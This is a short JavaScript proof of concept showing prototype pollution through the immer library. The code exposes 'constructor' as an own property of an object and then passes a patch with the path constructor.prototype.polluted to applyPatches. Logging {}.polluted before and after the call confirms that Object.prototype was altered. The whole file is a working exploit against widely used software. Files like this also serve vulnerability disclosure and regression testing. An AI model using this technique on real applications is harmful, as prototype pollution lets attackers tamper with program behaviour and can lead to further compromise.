var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {applyPatches, enablePatches} = require('immer');
enablePatches();
applyPatches(obj, [{
        op: 'add',
        path: [
            'constructor',
            'prototype',
            'polluted'
        ],
        value: 'yes'
    }]);
console.log({}.polluted);